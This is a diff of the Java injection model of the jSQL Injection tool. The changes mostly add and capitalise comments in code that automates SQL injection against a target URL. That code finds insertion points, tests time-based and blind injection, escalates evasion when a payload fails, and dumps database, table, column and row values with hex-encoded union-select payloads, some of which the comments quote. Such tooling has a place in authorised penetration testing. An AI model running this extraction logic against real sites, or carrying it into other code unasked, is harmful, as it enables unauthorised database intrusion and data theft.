@@ -78,7 +78,7 @@ firstSuccessPageSource,
 			   useBlindInjection = false,
 		   useTimeBasedInjection = false,
 
-		   		isInjectionBuilt = false; 	// allow to directly start an injection after a failed one
+		   		isInjectionBuilt = false; 	// Allow to directly start an injection after a failed one
 											// without asking the user 'Start a new injection?'
 	
 	private BlindInjection blindModel; 	// blind injection is processed by a separated class
@@ -88,7 +88,7 @@ firstSuccessPageSource,
 		this.sendMessage("-- jSQL Injection "+ jSQLVersion +" --");
 	}
 	
-	public int securitySteps = 0;	// current evasion degree, 0 is 'no evasion'
+	public int securitySteps = 0;	// Current evasion degree, 0 is 'no evasion'
 
 	/**
 	 * Prepares the injection process, can be interrupted by the user (via stopFlag)
@@ -133,7 +133,7 @@ firstSuccessPageSource,
 				System.setProperty("http.proxyPort", proxyPort);
 			}
 	
-			// test the connection
+			// Test the connection
 			try {
 				this.sendMessage("*** Starting new injection\nConnection test...");
 				
@@ -148,11 +148,11 @@ firstSuccessPageSource,
 				throw new PreparationException("Connection problem: " + e.getMessage());
 			}
 			
-			// define insertionCharacter, i.e, -1 in "[...].php?id=-1 union select[...]",
+			// Define insertionCharacter, i.e, -1 in "[...].php?id=-1 union select[...]",
 			this.sendMessage("Get insertion character...");
 			this.insertionCharacter = new Stoppable_getInsertionCharacter(this).begin();
 			
-			// test each injection methods: time, blind, error, normal
+			// Test each injection methods: time, blind, error, normal
 			this.sendMessage("Time based test...");
 			this.isTimeBasedInjectable = this.isTimeBasedInjectable();
 			if(this.isTimeBasedInjectable)
@@ -201,10 +201,10 @@ firstSuccessPageSource,
 				this.sendMessage("Using normal injection...");
 				new GUIThread("add-normal").run();
 				try{
-					// define visibleIndex, i.e, 2 in "[...]union select 1,2,[...]", if 2 is found in HTML source
+					// Define visibleIndex, i.e, 2 in "[...]union select 1,2,[...]", if 2 is found in HTML source
 					this.visibleIndex = this.getVisibleIndex(this.firstSuccessPageSource);
 				}catch(ArrayIndexOutOfBoundsException e){ 
-					// rare situation where injection fails after being validated, try with some evasion
+					// Rare situation where injection fails after being validated, try with some evasion
 					securitySteps++;
 					if(securitySteps<=2){
 						this.sendMessage("Injection not possible, testing evasion n°"+securitySteps+"...");
@@ -240,7 +240,7 @@ firstSuccessPageSource,
 	}
 	
 	/**
-	 * Runnable class defines the insertionCharacter that will be used by all futures requests,
+	 * That Runnable class defines the insertionCharacter that will be used by all futures requests,
 	 * i.e -1 in "[...].php?id=-1 union select[...]", sometimes it's -1, 0', 0, etc,
 	 * this class/function tries to find the working one by searching a special error message
 	 * in the source page
@@ -340,7 +340,7 @@ firstSuccessPageSource,
 	}
 
 	/**
-	 * Runnable class searches the correct number of fields in the SQL query,
+	 * That Runnable class searches the correct number of fields in the SQL query,
 	 * parallelizes the search, provides the stop capability
 	 */
 	private class Stoppable_getInitialQuery extends Stoppable{
@@ -402,7 +402,7 @@ firstSuccessPageSource,
 	}
 
 	/**
-	 * Runnable class searches the most efficient index,
+	 * That Runnable class searches the most efficient index,
 	 * some index will display lots of characters, others won't, so we sort them 
 	 * by order of efficiency: which one display the most characters?
 	 */	
@@ -514,7 +514,7 @@ firstSuccessPageSource,
 
 	/**
 	 * Test if blind works, can be stopped
-	 * @return
+	 * @return true if blind works
 	 */
 	private boolean isBlindInjectable() throws PreparationException {
 		blindModel = new BlindInjection(this, this.initialUrl+this.getData+this.insertionCharacter);
@@ -523,13 +523,17 @@ firstSuccessPageSource,
 
 	/**
 	 * Test if time based works, can be stopped
-	 * @return
+	 * @return true if time works
 	 */
 	private boolean isTimeBasedInjectable() throws PreparationException {
 		timeModel = new TimeInjection(this, this.initialUrl+this.getData+this.insertionCharacter);
 		return timeModel.isTimeInjectable();
 	}
 
+	/**
+	 * Get the first database informations
+	 * => version{%}database{%}user{%}CURRENT_USER
+	 */
 	private void getDBInfos() throws PreparationException, StoppableException {		
 		String[] sourcePage = {""};
 		
@@ -562,9 +566,18 @@ firstSuccessPageSource,
         this.currentUser = StringTool.hexstr(hexResult).split("\\{%\\}")[2];
         this.authenticatedUser = StringTool.hexstr(hexResult).split("\\{%\\}")[3];
         
+		// Inform the view that info should be displayed
 	    new GUIThread("add-info").run();	        
 	}
 
+	/**
+	 * Get all databases names and table count, then address them to the view
+	 * We use a hexadecimal format and parse the pattern
+	 * => hh[database name 1]jj[number of tables]hhgghh[database name 2]jj[number of tables]hhggh...hi
+	 * We can't expect that all the data will be found in one request, Stoppable_loopIntoResults helps to obtain
+	 * the rest of the unreachable data,
+	 * The process can be stopped by the user
+	 */
 	private void listDatabases() throws PreparationException, StoppableException {		
 		String[] sourcePage = {""};
 		String hexResult = new Stoppable_loopIntoResults(this).action(
@@ -595,15 +608,16 @@ firstSuccessPageSource,
 			null
 		);
 		
+		// Parse all the data we have retrieve
 		Matcher regexSearch = Pattern.compile("hh([0-9A-F]*)jj([0-9A-F]*)(c)?hh", Pattern.CASE_INSENSITIVE | Pattern.DOTALL).matcher(hexResult);
 		
 		if(!regexSearch.find()){
 			this.sendResponseFromSite( "Fetching databases fails", sourcePage[0].trim() );
 			throw new PreparationException();
 		}
-		
 		regexSearch.reset();
 		
+		// Build an array of Database objects from the data we have parsed
 		List<Database> databases = new ArrayList<Database>();
 		while(regexSearch.find()){ 
 		    String databaseName = StringTool.hexstr(regexSearch.group(1));
@@ -613,10 +627,20 @@ firstSuccessPageSource,
 			databases.add(newDatabase);
 		}
 		
+		// Address these objects to the view
 	    new GUIThread("add-databases", databases).run();	 
 	}
 
+	/**
+	 * Get all tables names and row count, then address them to the view
+	 * We use a hexadecimal format and parse the pattern
+	 * => hh[table name 1]jj[number of rows]hhgghh[table name 2]jj[number of rows]hhggh...hi
+	 * We can't expect that all the data will be found in one request, Stoppable_loopIntoResults helps to obtain
+	 * the rest of the unreachable data,
+	 * The process can be interrupted by the user (stop/pause)
+	 */
 	public void listTables(Database database, Interruptable interruptable) throws NumberFormatException, PreparationException, StoppableException {
+		// Inform the view that database has just been used
 	    new GUIThread("start-progress", database).run();
 
 		String tableCount = database.tableCount;
@@ -653,6 +677,7 @@ firstSuccessPageSource,
 			database
 		);
 	    
+		// Parse all the data we have retrieve
 		Matcher regexSearch = 
 				Pattern.compile("hh([0-9A-F]*)jj([0-9A-F]*)(c)?hh", Pattern.CASE_INSENSITIVE | Pattern.DOTALL).matcher(hexResult);
 		
@@ -661,6 +686,7 @@ firstSuccessPageSource,
 		}else{
 			regexSearch.reset();
 			
+			// Build an array of Table objects from the data we have parsed
 			List<Table> tables = new ArrayList<Table>();
 			while(regexSearch.find()){ 
 				String tableName = StringTool.hexstr(regexSearch.group(1));
@@ -670,14 +696,25 @@ firstSuccessPageSource,
 				tables.add(newTable);
 			}
 			
+			// Address these objects to the view
 		    new GUIThread("add-tables", tables).run();	        
 		}
 		
+		// Inform the view that database job is finished
 	    new GUIThread("end-progress", database).run();		
 	}
 	
+	/**
+	 * Get all columns names (we force count to 1, then ignore it), then address them to the view
+	 * We use a hexadecimal format and parse the pattern
+	 * => hh[column name 1]jj31hhgghh[column name 2]jj31hhggh...hi
+	 * We can't expect that all the data will be found in one request, Stoppable_loopIntoResults helps to obtain
+	 * the rest of the unreachable data,
+	 * The process can be interrupted by the user (stop/pause)
+	 */
 	public void listColumns(Table table, Interruptable interruptable) throws PreparationException, StoppableException {
-	    new GUIThread("start-indeterminate-progress", table).run();
+		// Inform the view that table has just been used
+		new GUIThread("start-indeterminate-progress", table).run();
 	    
 		String[] pageSource = {""};
 		String hexResult = new Stoppable_loopIntoResults(this, interruptable).action(
@@ -711,6 +748,7 @@ firstSuccessPageSource,
 			table
 		);
 	
+		// Parse all the data we have retrieve
 		Matcher regexSearch = Pattern.compile("hh([0-9A-F]*)jj([0-9A-F]*)(c)?hh", Pattern.CASE_INSENSITIVE | Pattern.DOTALL).matcher(hexResult);
 		
 		if(!regexSearch.find()){
@@ -718,6 +756,7 @@ firstSuccessPageSource,
 		}else{
 			regexSearch.reset();
 			
+			// Build an array of Column objects from the data we have parsed
 			List<Column> columns = new ArrayList<Column>();
 			while(regexSearch.find()){ 
 				String columnName = StringTool.hexstr(regexSearch.group(1));
@@ -726,23 +765,38 @@ firstSuccessPageSource,
 				columns.add(newColumn);
 			}
 			
+			// Address these objects to the view
 			new GUIThread("add-columns", columns).run();
 		}
 		
+		// Inform the view that table job is finished
 	    new GUIThread("end-indeterminate-progress", table).run();
 	}
 
+	/**
+	 * Get all values and their occurrences (we use GROUP BY), then address them to the view
+	 * We use a hexadecimal format and parse the pattern
+	 * => hh[value 1]jj[occurence]hhgghh[value 2]jj[occurence]hhggh...hi
+	 * We can't expect that all the data will be found in one request, Stoppable_loopIntoResults helps to obtain
+	 * the rest of the unreachable data,
+	 * The process can be interrupted by the user (stop/pause)
+	 */
 	public void listValues(List<Column> argsElementDatabase, Interruptable interruptable) throws PreparationException, StoppableException {
 		ElementDatabase database = argsElementDatabase.get(0).getParent().getParent();
 		ElementDatabase table = argsElementDatabase.get(0).getParent();
 		int rowCount = argsElementDatabase.get(0).getParent().getCount();
 		
+		// Inform the view that table has just been used
 	    new GUIThread("start-progress", table).run();
 	    
+	    // Build an array of column names
 		List<String> columnsName = new ArrayList<String>();
 		for(ElementDatabase e: argsElementDatabase)
 			columnsName.add(e+"");
 		
+	    // From that array, format the SQL fields nicely
+		// =>  col1{%}col2...
+		// ==> trim(ifnull(`col1`,0x00)),0x7f,trim(ifnull(`Col2`,0x00))...
 		String[] arrayColumns = columnsName.toArray(new String[columnsName.size()]);
 		String formatListColumn = StringTool.join(arrayColumns, "{%}");
 //		formatListColumn = formatListColumn.replace("{%}", "`),0x7f,trim(`" ); // 7f caractère d'effacement, dernier code hexa supporté par mysql, donne 3f=>? à partir de 80
@@ -773,16 +827,19 @@ firstSuccessPageSource,
 				, pageSource, true, rowCount, table
 		);
 
+		// Parse all the data we have retrieved
 		Matcher regexSearch = Pattern.compile("hh([0-9A-F]*)jj([0-9A-F]*)(c)?hh", Pattern.CASE_INSENSITIVE | Pattern.DOTALL).matcher(hexResult);
 		
 		if(!regexSearch.find()){
 			this.sendResponseFromSite( "Fetching values fails (row count may be approximate)", pageSource[0].trim() );
 		}
+		regexSearch.reset();
 		
 		int rowsFound = 0, duplicates = 0, cutted = 0;
 		List<List<String>> listValues = new ArrayList<List<String>>();
 			
-		regexSearch.reset();
+		// Build a 2D array of strings from the data we have parsed
+		// => row number, occurrence, value1, value2...
 		while(regexSearch.find()){ 
 			String values = StringTool.hexstr(regexSearch.group(1));
 			int instances = Integer.parseInt( StringTool.hexstr(regexSearch.group(2)) );
@@ -802,9 +859,11 @@ firstSuccessPageSource,
 		
 //    	System.out.println( "# Results: "+ duplicates +" duplicates, "+ rowsFound +" distinct values, " /*+ (rowCount-rowsFound-duplicates) +" unreachables duplicates, "*/ + cutted + " rows truncated\n");
 
+		// Add the default title to the columns 
         columnsName.add(0,"nbRow");
         columnsName.add(0,"#");
         
+        // Build a proper 2D array from the data
         String[][] tableDatas = new String[listValues.size()][columnsName.size()] ;
         for(int indexRow=0; indexRow<listValues.size() ;indexRow++){
         	boolean isIncomplete = false;
@@ -822,12 +881,21 @@ firstSuccessPageSource,
         }
 
 		arrayColumns = columnsName.toArray(new String[columnsName.size()]);
+		// Group the columns names, values and Table object in one array
 		Object[] objectData = {arrayColumns, tableDatas, table};
-		
+		// Address these objects to the view
 	    new GUIThread("add-values", objectData).run();
+		// Inform the view that table job is finished
 	    new GUIThread("end-progress", table).run();
 	}
 
+	/**
+	 * Get all data from a SQL request (remember that data will often been cut, we need to reach ALL the data)
+	 * We expect the following well formed
+	 * => hh[0-9A-F]*jj[0-9A-F]*c?hhgghh[0-9A-F]*jj[0-9A-F]*c?hh
+	 * We must check if that long line is cut, and where it is cut,
+	 * The process can be interrupted by the user (stop/pause)
+	 */
 	private class Stoppable_loopIntoResults extends Stoppable{
 		public Stoppable_loopIntoResults(InjectionModel model) {
 			super(model);
